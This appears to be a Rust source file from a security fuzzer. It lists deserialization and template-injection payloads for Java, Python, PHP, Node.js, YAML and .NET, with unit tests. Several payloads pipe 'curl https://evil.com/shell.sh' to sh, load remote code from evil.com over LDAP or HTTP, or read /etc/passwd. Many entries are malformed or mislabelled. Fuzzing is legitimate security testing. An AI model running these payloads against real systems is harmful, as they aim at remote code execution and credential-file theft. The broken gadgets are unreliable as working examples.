use crate::fuzzer::payloads::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    vec![
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"{"@type":"java.lang.Runtime","<init>":{"":"},"getRuntime":{"":"Runtime.getRuntime().exec('curl https://evil.com/shell.sh | sh')"}}"#.to_string(),
            description: "Java deserialization - Runtime exec".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "java".to_string(), "rce".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"{"@type":"java.lang.ProcessBuilder","command":["curl","-fsSL","https://evil.com/shell.sh","|","sh"]}"#.to_string(),
            description: "Java deserialization - ProcessBuilder".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "java".to_string(), "rce".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","transletBytecodes":["AA=="],"transletName":"evil","auxClasses":"","factory":"any"}}"#.to_string(),
            description: "Java deserialization - XSLTC TemplatesImpl".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "java".to_string(), "xsltc".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"{"@type":"org.apache.commons.collections.Transformer","iTransformer":{"@type":"org.apache.commons.collections.functors.InvokerTransformer","method":"getMethod","args":["getRuntime",[]],"invokerTransformer":{"@type":"org.apache.commons.collections.functors.InvokerTransformer","method":"invoke","args":[null,"exec","curl https://evil.com/shell.sh | sh"]}}}}"#.to_string(),
            description: "Java deserialization - Apache Commons Collections".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "java".to_string(), "cc".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"{"@type":"org.apache.commons.collections4.comparators.TransformingComparator","transformer":{"@type":"org.apache.commons.collections4.functors.InstantiateTransformer","constructorArgs":{"@type":"java.lang.ProcessBuilder","command":["whoami"]}}}}"#.to_string(),
            description: "Java deserialization - Commons Collections4".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "java".to_string(), "cc4".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"{"@type":"org.springframework.beans.factory.ObjectFactory","singleton":true,"object":{"@type":"java.lang.Runtime","val":"Runtime.getRuntime().exec('id')"}}}"#.to_string(),
            description: "Java deserialization - Spring ObjectFactory".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "java".to_string(), "spring".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"{"@type":"org.apache.commons.jelly.impl.Engine","script":{"@type":"javax.script.ScriptEngineManager"}}"#.to_string(),
            description: "Java deserialization - Jelly script engine".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "java".to_string(), "jelly".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"{"@type":"org.mozilla.javascript.NativeJavaObject","members":["getClass"]}"#.to_string(),
            description: "Java deserialization - Rhino script engine".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "java".to_string(), "rhino".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"O:32:"sun.reflect.annotation.AnnotationInvocationHandler":1:{s:3:"type";O:34:"java.lang.annotation.Annotation":0:{}s:7:"memberType";s:11:"application";}"#.to_string(),
            description: "Java deserialization - AnnotationInvocationHandler".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "java".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"rO0ABXNyABpqYXZhLmxhbmcuc3VmZmlY7RT8PCdMK6e4CAAB4cA=="#.to_string(),
            description: "Java deserialization - Base64 encoded gadget".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "java".to_string(), "base64".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"{"action":"login","data":"__python_object__":"O:12 django.http.request {}"#.to_string(),
            description: "Python deserialization - Django request object".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "python".to_string(), "django".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: "__import__('os').popen('curl https://evil.com/shell.sh | sh').read()".to_string(),
            description: "Python deserialization - os import exec".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "python".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"eval("__import__('os').system('id')")"#.to_string(),
            description: "Python deserialization - eval injection".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "python".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"pickle.loads(b"cposix\nsystem\np0\n(S'id'\np1\ntp2\nRp3\n.")"#.to_string(),
            description: "Python pickle deserialization - system command".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "python".to_string(), "pickle".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"c__builtin__\nopen\np0\n(S'/etc/passwd'\np1\ntp2\nRp3\n."#.to_string(),
            description: "Python pickle - file read".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "python".to_string(), "pickle".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"{{"".__class__.__mro__[2].__subclasses__()}}"#.to_string(),
            description: "Python Jinja2 template - class enumeration".to_string(),
            severity: Severity::High,
            tags: vec!["deser".to_string(), "python".to_string(), "jinja2".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"#.to_string(),
            description: "Python Jinja2 - RCE via request object".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "python".to_string(), "jinja2".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"<?xml version="1.0"?><!-DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
            description: "PHP deserialization - XXE in XML".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "php".to_string(), "xxe".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"O:31:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"socket";O:26:"Monolog\\Handler\\BufferHandler":0:{}}"#.to_string(),
            description: "PHP deserialization - Monolog gadget".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "php".to_string(), "monolog".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"O:6:"Guzzle":1:{s:12:"*handler";a:0:{}}"#.to_string(),
            description: "PHP deserialization - Guzzle handler".to_string(),
            severity: Severity::High,
            tags: vec!["deser".to_string(), "php".to_string(), "guzzle".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"C:16:"DoctrineBundle":0:{}"#.to_string(),
            description: "PHP deserialization - DoctrineBundle".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "php".to_string(), "doctrine".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"O:18:"SimpleXMLElement":2:{s:2:"id";i:9999;s:5:"__destruct";s:12:"phpinfo();";}"#.to_string(),
            description: "PHP deserialization - SimpleXMLElement".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "php".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"phpinfo();"#.to_string(),
            description: "PHP deserialization - phpinfo test".to_string(),
            severity: Severity::High,
            tags: vec!["deser".to_string(), "php".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"(new whoami())->getResult()"#.to_string(),
            description: "Ruby deserialization - method chaining".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "ruby".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"require('child_process').execSync('id')"#.to_string(),
            description: "Node.js deserialization - child_process".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "nodejs".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"{"__proto__":{"isAdmin":true}}"#.to_string(),
            description: "JS deserialization - prototype pollution".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "javascript".to_string(), "prototype".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"{"constructor":{"prototype":{"admin":true}}}"#.to_string(),
            description: "JS deserialization - constructor pollution".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "javascript".to_string(), "prototype".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"{{}.toSource()}"#.to_string(),
            description: "JS deserialization - toSource leak test".to_string(),
            severity: Severity::Medium,
            tags: vec!["deser".to_string(), "javascript".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil.com/evil.jar"]]]]"#.to_string(),
            description: "YAML deserialization - SnakeYAML ScriptEngine".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "yaml".to_string(), "java".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"!!java.lang.Runtime [!!java.lang.ProcessBuilder [["bash","-c","id"]]]"#.to_string(),
            description: "YAML deserialization - SnakeYAML Runtime".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "yaml".to_string(), "java".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"phar:///var/www/html/upload.jpg/test"#.to_string(),
            description: "PHP phar deserialization path".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "php".to_string(), "phar".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"AAEAAAD/////AQAAAAAAAAAMAgAAAFRTeXN0ZW0uRHJhdmluZy5CaW5hcnlGb3JtYXR0ZXI="#.to_string(),
            description: ".NET BinaryFormatter serialized object".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "dotnet".to_string(), "binary".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"/wEFAREAAQAAAP////8BAAAAAAIAAA=="#.to_string(),
            description: ".NET ViewState serialized payload".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "dotnet".to_string(), "viewstate".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"{"@type":"org.apache.commons.beanutils.BeanComparator","property":"class","comparator":{"@type":"java.util.Collections$ReverseComparator"}}"#.to_string(),
            description: "Java deserialization - CommonsBeanutils".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "java".to_string(), "commons-beanutils".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"__import__('os').system('id')"#.to_string(),
            description: "Python RestrictedPython escape".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "python".to_string(), "restricted".to_string()],
        },
        Payload {
            payload_type: PayloadType::Deser,
            payload: r#"{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/exploit","autoCommit":true}"#.to_string(),
            description: "Java deserialization - JdbcRowSetImpl JNDI".to_string(),
            severity: Severity::Critical,
            tags: vec!["deser".to_string(), "java".to_string(), "jndi".to_string()],
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_payloads_returns_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty());
    }

    #[test]
    fn test_get_payloads_count_reasonable() {
        let payloads = get_payloads();
        assert!(payloads.len() >= 25);
        assert!(payloads.len() < 10000);
    }

    #[test]
    fn test_payloads_are_non_empty_strings() {
        let payloads = get_payloads();
        for p in &payloads {
            assert!(
                !p.payload.is_empty(),
                "Payload is empty: {:?}",
                p.description
            );
        }
    }

    #[test]
    fn test_payloads_contain_expected_patterns() {
        let payloads = get_payloads();
        let has_java = payloads
            .iter()
            .any(|p| p.tags.contains(&"java".to_string()));
        let has_python = payloads
            .iter()
            .any(|p| p.tags.contains(&"python".to_string()));
        let has_php = payloads.iter().any(|p| p.tags.contains(&"php".to_string()));
        let has_prototype = payloads.iter().any(|p| p.payload.contains("__proto__"));
        assert!(has_java, "Missing Java deserialization payload");
        assert!(has_python, "Missing Python deserialization payload");
        assert!(has_php, "Missing PHP deserialization payload");
        assert!(has_prototype, "Missing prototype pollution payload");
    }
}
